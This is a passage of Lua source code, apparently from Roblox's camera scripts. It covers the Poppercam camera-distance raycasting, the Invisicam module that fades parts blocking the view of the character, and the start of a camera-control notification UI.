				player.CharacterAdded:Connect(characterAdded)
				player.CharacterRemoving:Connect(characterRemoving)
				if player.Character then
					characterAdded(player.Character)
				end
			end
		
			local function playerRemoving(player)
				charMap[player] = nil
				refreshIgnoreList()
			end
		
			Players.PlayerAdded:Connect(playerAdded)
			Players.PlayerRemoving:Connect(playerRemoving)
		
			for _, player in ipairs(Players:GetPlayers()) do
				playerAdded(player)
			end
			refreshIgnoreList()
		end
		
		--------------------------------------------------------------------------------------------
		-- Popper uses the level geometry find an upper bound on subject-to-camera distance.
		--
		-- Hard limits are applied immediately and unconditionally. They are generally caused
		-- when level geometry intersects with the near plane (with exceptions, see below).
		--
		-- Soft limits are only applied under certain conditions.
		-- They are caused when level geometry occludes the subject without actually intersecting
		-- with the near plane at the target distance.
		--
		-- Soft limits can be promoted to hard limits and hard limits can be demoted to soft limits.
		-- We usually don"t want the latter to happen.
		--
		-- A soft limit will be promoted to a hard limit if an obstruction
		-- lies between the current and target camera positions.
		--------------------------------------------------------------------------------------------
		
		local subjectRoot
		local subjectPart
		
		camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
			local subject = camera.CameraSubject
			if subject:IsA("Humanoid") then
				subjectPart = subject.RootPart
			elseif subject:IsA("BasePart") then
				subjectPart = subject
			else
				subjectPart = nil
			end
		end)
		
		local function canOcclude(part)
			-- Occluders must be:
			-- 1. Opaque
			-- 2. Interactable
			-- 3. Not in the same assembly as the subject
		
			return
				getTotalTransparency(part) < 0.25 and
				part.CanCollide and
				subjectRoot ~= (part:GetRootPart() or part) and
				not part:IsA("TrussPart")
		end
		
		-- Offsets for the volume visibility test
		local SCAN_SAMPLE_OFFSETS = {
			Vector2.new( 0.4, 0.0),
			Vector2.new(-0.4, 0.0),
			Vector2.new( 0.0,-0.4),
			Vector2.new( 0.0, 0.4),
			Vector2.new( 0.0, 0.2),
		}
		
		-- Maximum number of rays that can be cast 
		local QUERY_POINT_CAST_LIMIT = 64
		
		--------------------------------------------------------------------------------
		-- Piercing raycasts
		
		local function getCollisionPoint(origin, dir)
			local originalSize = #blacklist
			repeat
				local hitPart, hitPoint = workspace:FindPartOnRayWithIgnoreList(
					ray(origin, dir), blacklist, false, true
				)
		
				if hitPart then
					if hitPart.CanCollide then
						eraseFromEnd(blacklist, originalSize)
						return hitPoint, true
					end
					blacklist[#blacklist + 1] = hitPart
				end
			until not hitPart
		
			eraseFromEnd(blacklist, originalSize)
			return origin + dir, false
		end
		
		--------------------------------------------------------------------------------
		
		local function queryPoint(origin, unitDir, dist, lastPos)
			debug.profilebegin("queryPoint")
		
			local originalSize = #blacklist
		
			dist = dist + nearPlaneZ
			local target = origin + unitDir*dist
		
			local softLimit = inf
			local hardLimit = inf
			local movingOrigin = origin
			
			local numPierced = 0
		
			repeat
				local entryPart, entryPos = workspace:FindPartOnRayWithIgnoreList(ray(movingOrigin, target - movingOrigin), blacklist, false, true)
				numPierced += 1
		
				if entryPart then
					-- forces the current iteration into a hard limit to cap the number of raycasts
					local earlyAbort = numPierced >= QUERY_POINT_CAST_LIMIT
					
					if canOcclude(entryPart) or earlyAbort then
						local wl = {entryPart}
						local exitPart = workspace:FindPartOnRayWithWhitelist(ray(target, entryPos - target), wl, true)
		
						local lim = (entryPos - origin).Magnitude
		
						if exitPart and not earlyAbort then
							local promote = false
							if lastPos then
								promote =
									workspace:FindPartOnRayWithWhitelist(ray(lastPos, target - lastPos), wl, true) or
									workspace:FindPartOnRayWithWhitelist(ray(target, lastPos - target), wl, true)
							end
		
							if promote then
								-- Ostensibly a soft limit, but the camera has passed through it in the last frame, so promote to a hard limit.
								hardLimit = lim
							elseif dist < softLimit then
								-- Trivial soft limit
								softLimit = lim
							end
						else
							-- Trivial hard limit
							hardLimit = lim
						end
					end
		
					blacklist[#blacklist + 1] = entryPart
					movingOrigin = entryPos - unitDir*1e-3
				end
			until hardLimit < inf or not entryPart
		
			eraseFromEnd(blacklist, originalSize)
		
			debug.profileend()
			return softLimit - nearPlaneZ, hardLimit - nearPlaneZ
		end
		
		local function queryViewport(focus, dist)
			debug.profilebegin("queryViewport")
		
			local fP =  focus.p
			local fX =  focus.rightVector
			local fY =  focus.upVector
			local fZ = -focus.lookVector
		
			local viewport = camera.ViewportSize
		
			local hardBoxLimit = inf
			local softBoxLimit = inf
		
			-- Center the viewport on the PoI, sweep points on the edge towards the target, and take the minimum limits
			for viewX = 0, 1 do
				local worldX = fX*((viewX - 0.5)*projX)
		
				for viewY = 0, 1 do
					local worldY = fY*((viewY - 0.5)*projY)
		
					local origin = fP + nearPlaneZ*(worldX + worldY)
					local lastPos = camera:ViewportPointToRay(
						viewport.x*viewX,
						viewport.y*viewY
					).Origin
		
					local softPointLimit, hardPointLimit = queryPoint(origin, fZ, dist, lastPos)
		
					if hardPointLimit < hardBoxLimit then
						hardBoxLimit = hardPointLimit
					end
					if softPointLimit < softBoxLimit then
						softBoxLimit = softPointLimit
					end
				end
			end
			debug.profileend()
		
			return softBoxLimit, hardBoxLimit
		end
		
		local function testPromotion(focus, dist, focusExtrapolation)
			debug.profilebegin("testPromotion")
		
			local fP = focus.p
			local fX = focus.rightVector
			local fY = focus.upVector
			local fZ = -focus.lookVector
		
			do
				-- Dead reckoning the camera rotation and focus
				debug.profilebegin("extrapolate")
		
				local SAMPLE_DT = 0.0625
				local SAMPLE_MAX_T = 1.25
		
				local maxDist = (getCollisionPoint(fP, focusExtrapolation.posVelocity*SAMPLE_MAX_T) - fP).Magnitude
				-- Metric that decides how many samples to take
				local combinedSpeed = focusExtrapolation.posVelocity.magnitude
		
				for dt = 0, min(SAMPLE_MAX_T, focusExtrapolation.rotVelocity.magnitude + maxDist/combinedSpeed), SAMPLE_DT do
					local cfDt = focusExtrapolation.extrapolate(dt) -- Extrapolated CFrame at time dt
		
					if queryPoint(cfDt.p, -cfDt.lookVector, dist) >= dist then
						return false
					end
				end
		
				debug.profileend()
			end
		
			do
				-- Test screen-space offsets from the focus for the presence of soft limits
				debug.profilebegin("testOffsets")
		
				for _, offset in ipairs(SCAN_SAMPLE_OFFSETS) do
					local scaledOffset = offset
					local pos = getCollisionPoint(fP, fX*scaledOffset.x + fY*scaledOffset.y)
					if queryPoint(pos, (fP + fZ*dist - pos).Unit, dist) == inf then
						return false
					end
				end
		
				debug.profileend()
			end
		
			debug.profileend()
			return true
		end
		
		local function Popper(focus, targetDist, focusExtrapolation)
			debug.profilebegin("popper")
		
			subjectRoot = subjectPart and subjectPart:GetRootPart() or subjectPart
		
			local dist = targetDist
			local soft, hard = queryViewport(focus, targetDist)
			if hard < dist then
				dist = hard
			end
			if soft < dist and testPromotion(focus, targetDist, focusExtrapolation) then
				dist = soft
			end
		
			subjectRoot = nil
		
			debug.profileend()
			return dist
		end
		
		return Popper
		
	end[invisicam] = function()
		--[[
			Invisicam - Occlusion module that makes objects occluding character view semi-transparent
			2018 Camera Update - AllYourBlox		
		--]]
		
		--[[ Top Level Roblox Services ]]--
		local PlayersService = game:GetService("Players")
		
		--[[ Constants ]]--
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local USE_STACKING_TRANSPARENCY = true	-- Multiple items between the subject and camera get transparency values that add up to TARGET_TRANSPARENCY
		local TARGET_TRANSPARENCY = 0.75 -- Classic Invisicam's Value, also used by new invisicam for parts hit by head and torso rays
		local TARGET_TRANSPARENCY_PERIPHERAL = 0.5 -- Used by new SMART_CIRCLE mode for items not hit by head and torso rays
		
		local MODE = {
			--CUSTOM = 1, 		-- Retired, unused
			LIMBS = 2, 			-- Track limbs
			MOVEMENT = 3, 		-- Track movement
			CORNERS = 4, 		-- Char model corners
			CIRCLE1 = 5, 		-- Circle of casts around character
			CIRCLE2 = 6, 		-- Circle of casts around character, camera relative
			LIMBMOVE = 7, 		-- LIMBS mode + MOVEMENT mode
			SMART_CIRCLE = 8, 	-- More sample points on and around character
			CHAR_OUTLINE = 9,	-- Dynamic outline around the character
		}
		
		local LIMB_TRACKING_SET = {
			-- Body parts common to R15 and R6
			['Head'] = true,
		
			-- Body parts unique to R6
			['Left Arm'] = true,
			['Right Arm'] = true,
			['Left Leg'] = true,
			['Right Leg'] = true,
		
			-- Body parts unique to R15
			['LeftLowerArm'] = true,
			['RightLowerArm'] = true,
			['LeftUpperLeg'] = true,
			['RightUpperLeg'] = true
		}
		
		local CORNER_FACTORS = {
			Vector3.new(1,1,-1),
			Vector3.new(1,-1,-1),
			Vector3.new(-1,-1,-1),
			Vector3.new(-1,1,-1)
		}
		
		local CIRCLE_CASTS = 10
		local MOVE_CASTS = 3
		local SMART_CIRCLE_CASTS = 24
		local SMART_CIRCLE_INCREMENT = 2.0 * math.pi / SMART_CIRCLE_CASTS
		local CHAR_OUTLINE_CASTS = 24
		
		-- Used to sanitize user-supplied functions
		local function AssertTypes(param, ...)
			local allowedTypes = {}
			local typeString = ''
			for _, typeName in pairs({...}) do
				allowedTypes[typeName] = true
				typeString = typeString .. (typeString == '' and '' or ' or ') .. typeName
			end
			local theType = type(param)
			assert(allowedTypes[theType], typeString .. " type expected, got: " .. theType)
		end
		
		-- Helper function for Determinant of 3x3, not in CameraUtils for performance reasons
		local function Det3x3(a,b,c,d,e,f,g,h,i)
			return (a*(e*i-f*h)-b*(d*i-f*g)+c*(d*h-e*g))
		end
		
		-- Smart Circle mode needs the intersection of 2 rays that are known to be in the same plane
		-- because they are generated from cross products with a common vector. This function is computing
		-- that intersection, but it's actually the general solution for the point halfway between where
		-- two skew lines come nearest to each other, which is more forgiving.
		local function RayIntersection(p0, v0, p1, v1)
			local v2 = v0:Cross(v1)
			local d1 = p1.x - p0.x
			local d2 = p1.y - p0.y
			local d3 = p1.z - p0.z
			local denom = Det3x3(v0.x,-v1.x,v2.x,v0.y,-v1.y,v2.y,v0.z,-v1.z,v2.z)
		
			if (denom == 0) then
				return ZERO_VECTOR3 -- No solution (rays are parallel)
			end
		
			local t0 = Det3x3(d1,-v1.x,v2.x,d2,-v1.y,v2.y,d3,-v1.z,v2.z) / denom
			local t1 = Det3x3(v0.x,d1,v2.x,v0.y,d2,v2.y,v0.z,d3,v2.z) / denom
			local s0 = p0 + t0 * v0
			local s1 = p1 + t1 * v1
			local s = s0 + 0.5 * ( s1 - s0 )
		
			-- 0.25 studs is a threshold for deciding if the rays are
			-- close enough to be considered intersecting, found through testing 
			if (s1-s0).Magnitude < 0.25 then
				return s
			else
				return ZERO_VECTOR3
			end
		end
		
		
		
		--[[ The Module ]]--
		local BaseOcclusion = require(script.Parent:WaitForChild("BaseOcclusion"))
		local Invisicam = setmetatable({}, BaseOcclusion)
		Invisicam.__index = Invisicam
		
		function Invisicam.new()
			local self = setmetatable(BaseOcclusion.new(), Invisicam)
		
			self.char = nil
			self.humanoidRootPart = nil
			self.torsoPart = nil
			self.headPart = nil
		
			self.childAddedConn = nil
			self.childRemovedConn = nil
		
			self.behaviors = {} 	-- Map of modes to behavior fns
			self.behaviors[MODE.LIMBS] = self.LimbBehavior
			self.behaviors[MODE.MOVEMENT] = self.MoveBehavior
			self.behaviors[MODE.CORNERS] = self.CornerBehavior
			self.behaviors[MODE.CIRCLE1] = self.CircleBehavior
			self.behaviors[MODE.CIRCLE2] = self.CircleBehavior
			self.behaviors[MODE.LIMBMOVE] = self.LimbMoveBehavior
			self.behaviors[MODE.SMART_CIRCLE] = self.SmartCircleBehavior
			self.behaviors[MODE.CHAR_OUTLINE] = self.CharacterOutlineBehavior
		
			self.mode = MODE.SMART_CIRCLE
			self.behaviorFunction = self.SmartCircleBehavior
		
			self.savedHits = {} 	-- Objects currently being faded in/out
			self.trackedLimbs = {}	-- Used in limb-tracking casting modes
		
			self.camera = game.Workspace.CurrentCamera
		
			self.enabled = false
			return self
		end
		
		function Invisicam:Enable(enable)
			self.enabled = enable
		
			if not enable then
				self:Cleanup()
			end
		end
		
		function Invisicam:GetOcclusionMode()
			return Enum.DevCameraOcclusionMode.Invisicam
		end
		
		--[[ Module functions ]]--
		function Invisicam:LimbBehavior(castPoints)
			for limb, _ in pairs(self.trackedLimbs) do
				castPoints[#castPoints + 1] = limb.Position
			end
		end
		
		function Invisicam:MoveBehavior(castPoints)
			for i = 1, MOVE_CASTS do
				local position, velocity = self.humanoidRootPart.Position, self.humanoidRootPart.Velocity
				local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude / 2
				local offsetVector = (i - 1) * self.humanoidRootPart.CFrame.lookVector * horizontalSpeed
				castPoints[#castPoints + 1] = position + offsetVector
			end
		end
		
		function Invisicam:CornerBehavior(castPoints)
			local cframe = self.humanoidRootPart.CFrame
			local centerPoint = cframe.p
			local rotation = cframe - centerPoint
			local halfSize = self.char:GetExtentsSize() / 2 --NOTE: Doesn't update w/ limb animations
			castPoints[#castPoints + 1] = centerPoint
			for i = 1, #CORNER_FACTORS do
				castPoints[#castPoints + 1] = centerPoint + (rotation * (halfSize * CORNER_FACTORS[i]))
			end
		end
		
		function Invisicam:CircleBehavior(castPoints)
			local cframe
			if self.mode == MODE.CIRCLE1 then
				cframe = self.humanoidRootPart.CFrame
			else
				local camCFrame = self.camera.CoordinateFrame
				cframe = camCFrame - camCFrame.p + self.humanoidRootPart.Position
			end
			castPoints[#castPoints + 1] = cframe.p
			for i = 0, CIRCLE_CASTS - 1 do
				local angle = (2 * math.pi / CIRCLE_CASTS) * i
				local offset = 3 * Vector3.new(math.cos(angle), math.sin(angle), 0)
				castPoints[#castPoints + 1] = cframe * offset
			end
		end
		
		function Invisicam:LimbMoveBehavior(castPoints)
			self:LimbBehavior(castPoints)
			self:MoveBehavior(castPoints)
		end
		
		function Invisicam:CharacterOutlineBehavior(castPoints)
			local torsoUp = self.torsoPart.CFrame.upVector.unit
			local torsoRight = self.torsoPart.CFrame.rightVector.unit
		
			-- Torso cross of points for interior coverage
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
			if self.headPart then
				castPoints[#castPoints + 1] = self.headPart.CFrame.p
			end
		
			local cframe = CFrame.new(ZERO_VECTOR3,Vector3.new(self.camera.CoordinateFrame.lookVector.X,0,self.camera.CoordinateFrame.lookVector.Z))
			local centerPoint = (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)
		
			local partsWhitelist = {self.torsoPart}
			if self.headPart then
				partsWhitelist[#partsWhitelist + 1] = self.headPart
			end
		
			for i = 1, CHAR_OUTLINE_CASTS do
				local angle = (2 * math.pi * i / CHAR_OUTLINE_CASTS)
				local offset = cframe * (3 * Vector3.new(math.cos(angle), math.sin(angle), 0))
		
				offset = Vector3.new(offset.X, math.max(offset.Y, -2.25), offset.Z)	
		
				local ray = Ray.new(centerPoint + offset, -3 * offset)
				local hit, hitPoint = game.Workspace:FindPartOnRayWithWhitelist(ray, partsWhitelist, false, false)
		
				if hit then
					-- Use hit point as the cast point, but nudge it slightly inside the character so that bumping up against
					-- walls is less likely to cause a transparency glitch
					castPoints[#castPoints + 1] = hitPoint + 0.2 * (centerPoint - hitPoint).unit
				end
			end
		end
		
		function Invisicam:SmartCircleBehavior(castPoints)
			local torsoUp = self.torsoPart.CFrame.upVector.unit
			local torsoRight = self.torsoPart.CFrame.rightVector.unit
		
			-- SMART_CIRCLE mode includes rays to head and 5 to the torso.
			-- Hands, arms, legs and feet are not included since they
			-- are not canCollide and can therefore go inside of parts
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoUp
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p + torsoRight
			castPoints[#castPoints + 1] = self.torsoPart.CFrame.p - torsoRight
			if self.headPart then
				castPoints[#castPoints + 1] = self.headPart.CFrame.p
			end
		
			local cameraOrientation = self.camera.CFrame - self.camera.CFrame.p
			local torsoPoint = Vector3.new(0,0.5,0) + (self.torsoPart and self.torsoPart.Position or self.humanoidRootPart.Position)
			local radius = 2.5
		
			-- This loop first calculates points in a circle of radius 2.5 around the torso of the character, in the
			-- plane orthogonal to the camera's lookVector. Each point is then raycast to, to determine if it is within
			-- the free space surrounding the player (not inside anything). Two iterations are done to adjust points that
			-- are inside parts, to try to move them to valid locations that are still on their camera ray, so that the
			-- circle remains circular from the camera's perspective, but does not cast rays into walls or parts that are
			-- behind, below or beside the character and not really obstructing view of the character. This minimizes
			-- the undesirable situation where the character walks up to an exterior wall and it is made invisible even
			-- though it is behind the character.
			for i = 1, SMART_CIRCLE_CASTS do
				local angle = SMART_CIRCLE_INCREMENT * i - 0.5 * math.pi
				local offset = radius * Vector3.new(math.cos(angle), math.sin(angle), 0)
				local circlePoint = torsoPoint + cameraOrientation * offset
		
				-- Vector from camera to point on the circle being tested
				local vp = circlePoint - self.camera.CFrame.p
		
				local ray = Ray.new(torsoPoint, circlePoint - torsoPoint)
				local hit, hp, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
				local castPoint = circlePoint
		
				if hit then
					local hprime = hp + 0.1 * hitNormal.unit -- Slightly offset hit point from the hit surface
					local v0 = hprime - torsoPoint -- Vector from torso to offset hit point
		
					local perp = (v0:Cross(vp)).unit
		
					-- Vector from the offset hit point, along the hit surface
					local v1 = (perp:Cross(hitNormal)).unit
		
					-- Vector from camera to offset hit
					local vprime = (hprime - self.camera.CFrame.p).unit
		
					-- This dot product checks to see if the vector along the hit surface would hit the correct
					-- side of the invisicam cone, or if it would cross the camera look vector and hit the wrong side
					if ( v0.unit:Dot(-v1) < v0.unit:Dot(vprime)) then
						castPoint = RayIntersection(hprime, v1, circlePoint, vp)
		
						if castPoint.Magnitude > 0 then
							local ray = Ray.new(hprime, castPoint - hprime)
							local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
		
							if hit then
								local hprime2 = hitPoint + 0.1 * hitNormal.unit
								castPoint = hprime2
							end
						else
							castPoint = hprime
						end
					else
						castPoint = hprime
					end
		
					local ray = Ray.new(torsoPoint, (castPoint - torsoPoint))
					local hit, hitPoint, hitNormal = game.Workspace:FindPartOnRayWithIgnoreList(ray, {self.char}, false, false )
		
					if hit then
						local castPoint2 = hitPoint - 0.1 * (castPoint - torsoPoint).unit
						castPoint = castPoint2
					end
				end
		
				castPoints[#castPoints + 1] = castPoint
			end
		end
		
		function Invisicam:CheckTorsoReference()
			if self.char then
				self.torsoPart = self.char:FindFirstChild("Torso")
				if not self.torsoPart then
					self.torsoPart = self.char:FindFirstChild("UpperTorso")
					if not self.torsoPart then
						self.torsoPart = self.char:FindFirstChild("HumanoidRootPart")
					end
				end
		
				self.headPart = self.char:FindFirstChild("Head")
			end
		end
		
		function Invisicam:CharacterAdded(char, player)
			-- We only want the LocalPlayer's character
			if player~=PlayersService.LocalPlayer then return end
		
			if self.childAddedConn then
				self.childAddedConn:Disconnect()
				self.childAddedConn = nil
			end
			if self.childRemovedConn then
				self.childRemovedConn:Disconnect()
				self.childRemovedConn = nil
			end
		
			self.char = char
		
			self.trackedLimbs = {}
			local function childAdded(child)
				if child:IsA("BasePart") then
					if LIMB_TRACKING_SET[child.Name] then
						self.trackedLimbs[child] = true
					end
		
					if child.Name == "Torso" or child.Name == "UpperTorso" then
						self.torsoPart = child
					end
		
					if child.Name == "Head" then
						self.headPart = child
					end
				end
			end
		
			local function childRemoved(child)
				self.trackedLimbs[child] = nil
		
				-- If removed/replaced part is 'Torso' or 'UpperTorso' double check that we still have a TorsoPart to use
				self:CheckTorsoReference()
			end
		
			self.childAddedConn = char.ChildAdded:Connect(childAdded)
			self.childRemovedConn = char.ChildRemoved:Connect(childRemoved)
			for _, child in pairs(self.char:GetChildren()) do
				childAdded(child)
			end
		end
		
		function Invisicam:SetMode(newMode)
			AssertTypes(newMode, 'number')
			for _, modeNum in pairs(MODE) do
				if modeNum == newMode then
					self.mode = newMode
					self.behaviorFunction = self.behaviors[self.mode]
					return
				end
			end
			error("Invalid mode number")
		end
		
		function Invisicam:GetObscuredParts()
			return self.savedHits
		end
		
		-- Want to turn off Invisicam? Be sure to call this after.
		function Invisicam:Cleanup()
			for hit, originalFade in pairs(self.savedHits) do
				hit.LocalTransparencyModifier = originalFade
			end
		end
		
		function Invisicam:Update(dt, desiredCameraCFrame, desiredCameraFocus)
			-- Bail if there is no Character
			if not self.enabled or not self.char then
				return desiredCameraCFrame, desiredCameraFocus
			end
		
			self.camera = game.Workspace.CurrentCamera
		
			-- TODO: Move this to a GetHumanoidRootPart helper, probably combine with CheckTorsoReference
			-- Make sure we still have a HumanoidRootPart
			if not self.humanoidRootPart then
				local humanoid = self.char:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.RootPart then
					self.humanoidRootPart = humanoid.RootPart
				else
					-- Not set up with Humanoid? Try and see if there's one in the Character at all:
					self.humanoidRootPart = self.char:FindFirstChild("HumanoidRootPart")
					if not self.humanoidRootPart then
						-- Bail out, since we're relying on HumanoidRootPart existing
						return desiredCameraCFrame, desiredCameraFocus
					end
				end
		
				-- TODO: Replace this with something more sensible
				local ancestryChangedConn
				ancestryChangedConn = self.humanoidRootPart.AncestryChanged:Connect(function(child, parent)
					if child == self.humanoidRootPart and not parent then 
						self.humanoidRootPart = nil
						if ancestryChangedConn and ancestryChangedConn.Connected then
							ancestryChangedConn:Disconnect()
							ancestryChangedConn = nil
						end
					end
				end)
			end
		
			if not self.torsoPart then
				self:CheckTorsoReference()
				if not self.torsoPart then
					-- Bail out, since we're relying on Torso existing, should never happen since we fall back to using HumanoidRootPart as torso
					return desiredCameraCFrame, desiredCameraFocus
				end
			end
		
			-- Make a list of world points to raycast to
			local castPoints = {}
			self.behaviorFunction(self, castPoints)
		
			-- Cast to get a list of objects between the camera and the cast points
			local currentHits = {}
			local ignoreList = {self.char}
			local function add(hit)
				currentHits[hit] = true
				if not self.savedHits[hit] then
					self.savedHits[hit] = hit.LocalTransparencyModifier
				end
			end
		
			local hitParts
			local hitPartCount = 0
		
			-- Hash table to treat head-ray-hit parts differently than the rest of the hit parts hit by other rays
			-- head/torso ray hit parts will be more transparent than peripheral parts when USE_STACKING_TRANSPARENCY is enabled
			local headTorsoRayHitParts = {}
		
			local perPartTransparencyHeadTorsoHits = TARGET_TRANSPARENCY
			local perPartTransparencyOtherHits = TARGET_TRANSPARENCY
		
			if USE_STACKING_TRANSPARENCY then
		
				-- This first call uses head and torso rays to find out how many parts are stacked up
				-- for the purpose of calculating required per-part transparency
				local headPoint = self.headPart and self.headPart.CFrame.p or castPoints[1]
				local torsoPoint = self.torsoPart and self.torsoPart.CFrame.p or castPoints[2]
				hitParts = self.camera:GetPartsObscuringTarget({headPoint, torsoPoint}, ignoreList)
		
				-- Count how many things the sample rays passed through, including decals. This should only
				-- count decals facing the camera, but GetPartsObscuringTarget does not return surface normals,
				-- so my compromise for now is to just let any decal increase the part count by 1. Only one
				-- decal per part will be considered.
				for i = 1, #hitParts do
					local hitPart = hitParts[i]
					hitPartCount = hitPartCount + 1 -- count the part itself
					headTorsoRayHitParts[hitPart] = true
					for _, child in pairs(hitPart:GetChildren()) do
						if child:IsA('Decal') or child:IsA('Texture') then
							hitPartCount = hitPartCount + 1 -- count first decal hit, then break
							break
						end
					end
				end
		
				if (hitPartCount > 0) then
					perPartTransparencyHeadTorsoHits = math.pow( ((0.5 * TARGET_TRANSPARENCY) + (0.5 * TARGET_TRANSPARENCY / hitPartCount)), 1 / hitPartCount )
					perPartTransparencyOtherHits = math.pow( ((0.5 * TARGET_TRANSPARENCY_PERIPHERAL) + (0.5 * TARGET_TRANSPARENCY_PERIPHERAL / hitPartCount)), 1 / hitPartCount )
				end
			end
		
			-- Now get all the parts hit by all the rays
			hitParts = self.camera:GetPartsObscuringTarget(castPoints, ignoreList)
		
			local partTargetTransparency = {}
		
			-- Include decals and textures
			for i = 1, #hitParts do
				local hitPart = hitParts[i]
		
				partTargetTransparency[hitPart] =headTorsoRayHitParts[hitPart] and perPartTransparencyHeadTorsoHits or perPartTransparencyOtherHits
		
				-- If the part is not already as transparent or more transparent than what invisicam requires, add it to the list of
				-- parts to be modified by invisicam
				if hitPart.Transparency < partTargetTransparency[hitPart] then
					add(hitPart)
				end
		
				-- Check all decals and textures on the part
				for _, child in pairs(hitPart:GetChildren()) do
					if child:IsA('Decal') or child:IsA('Texture') then
						if (child.Transparency < partTargetTransparency[hitPart]) then
							partTargetTransparency[child] = partTargetTransparency[hitPart]
							add(child)
						end
					end
				end
			end
		
			-- Invisibilize objects that are in the way, restore those that aren't anymore
			for hitPart, originalLTM in pairs(self.savedHits) do
				if currentHits[hitPart] then
					-- LocalTransparencyModifier gets whatever value is required to print the part's total transparency to equal perPartTransparency
					hitPart.LocalTransparencyModifier = (hitPart.Transparency < 1) and ((partTargetTransparency[hitPart] - hitPart.Transparency) / (1.0 - hitPart.Transparency)) or 0
				else -- Restore original pre-invisicam value of LTM
					hitPart.LocalTransparencyModifier = originalLTM
					self.savedHits[hitPart] = nil
				end
			end
		
			-- Invisicam does not change the camera values
			return desiredCameraCFrame, desiredCameraFocus
		end
		
		return Invisicam
	end[camera_ui] = function()
		local Players = game:GetService("Players")
		local TweenService = game:GetService("TweenService")
		
		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		local function waitForChildOfClass(parent, class)
			local child = parent:FindFirstChildOfClass(class)
			while not child or child.ClassName ~= class do
				child = parent.ChildAdded:Wait()
			end
			return child
		end
		
		local PlayerGui = waitForChildOfClass(LocalPlayer, "PlayerGui")
		
		local TOAST_OPEN_SIZE = UDim2.new(0, 326, 0, 58)
		local TOAST_CLOSED_SIZE = UDim2.new(0, 80, 0, 58)
		local TOAST_BACKGROUND_COLOR = Color3.fromRGB(32, 32, 32)
		local TOAST_BACKGROUND_TRANS = 0.4
		local TOAST_FOREGROUND_COLOR = Color3.fromRGB(200, 200, 200)
		local TOAST_FOREGROUND_TRANS = 0
		
		-- Convenient syntax for creating a tree of instanes
		local function create(className)
			return function(props)
				local inst = Instance.new(className)
				local parent = props.Parent
				props.Parent = nil
				for name, val in pairs(props) do
					if type(name) == "string" then
						inst[name] = val
					else
						val.Parent = inst
					end
				end
				-- Only set parent after all other properties are initialized
				inst.Parent = parent
				return inst
			end
		end
		
		local initialized = false
		
		local uiRoot
		local toast
		local toastIcon
		local toastUpperText
		local toastLowerText
		
		local function initializeUI()
			assert(not initialized)
		
			uiRoot = create("ScreenGui"){
				Name = "RbxCameraUI",
				AutoLocalize = false,
				Enabled = true,
				DisplayOrder = -1, -- Appears behind default developer UI
				IgnoreGuiInset = false,
				ResetOnSpawn = false,
				ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
		
				create("ImageLabel"){
					Name = "Toast",
					Visible = false,
					AnchorPoint = Vector2.new(0.5, 0),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(0.5, 0, 0, 8),
					Size = TOAST_CLOSED_SIZE,
					Image = "rbxasset://textures/ui/Camera/CameraToast9Slice.png",
					ImageColor3 = TOAST_BACKGROUND_COLOR,
					ImageRectSize = Vector2.new(6, 6),
					ImageTransparency = 1,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(3, 3, 3, 3),
					ClipsDescendants = true,
		
					create("Frame"){
						Name = "IconBuffer",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 0, 0, 0),
						Size = UDim2.new(0, 80, 1, 0),
		
						create("ImageLabel"){
							Name = "Icon",
							AnchorPoint = Vector2.new(0.5, 0.5),
							BackgroundTransparency = 1,
							Position = UDim2.new(0.5, 0, 0.5, 0),
							Size = UDim2.new(0, 48, 0, 48),
							ZIndex = 2,
							Image = "rbxasset://textures/ui/Camera/CameraToastIcon.png",
							ImageColor3 = TOAST_FOREGROUND_COLOR,
							ImageTransparency = 1,
						}
					},
		
					create("Frame"){
						Name = "TextBuffer",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 80, 0, 0),
						Size = UDim2.new(1, -80, 1, 0),
						ClipsDescendants = true,
		
						create("TextLabel"){
							Name = "Upper",
							AnchorPoint = Vector2.new(0, 1),
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 0, 0.5, 0),
							Size = UDim2.new(1, 0, 0, 19),
							Font = Enum.Font.GothamSemibold,
							Text = "Camera control enabled",
							TextColor3 = TOAST_FOREGROUND_COLOR,
							TextTransparency = 1,
							TextSize = 19,
							TextXAlignment = Enum.TextXAlignment.Left,
							TextYAlignment = Enum.TextYAlignment.Center,
						},
		
						create("TextLabel"){
							Name = "Lower",
							AnchorPoint = Vector2.new(0, 0),
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 0, 0.5, 3),
							Size = UDim2.new(1, 0, 0, 15),
							Font = Enum.Font.Gotham,
							Text = "Right mouse button to toggle",
							TextColor3 = TOAST_FOREGROUND_COLOR,
							TextTransparency = 1,
							TextSize = 15,
							TextXAlignment = Enum.TextXAlignment.Left,
							TextYAlignment = Enum.TextYAlignment.Center,
						},
					},
				},
		
				Parent = PlayerGui,
			}
		
			toast = uiRoot.Toast
			toastIcon = toast.IconBuffer.Icon
			toastUpperText = toast.TextBuffer.Upper
			toastLowerText = toast.TextBuffer.Lower
		
			initialized = true
		end
		
		local CameraUI = {}
		
		do
			-- Instantaneously disable the toast or enable for opening later on. Used when switching camera modes.
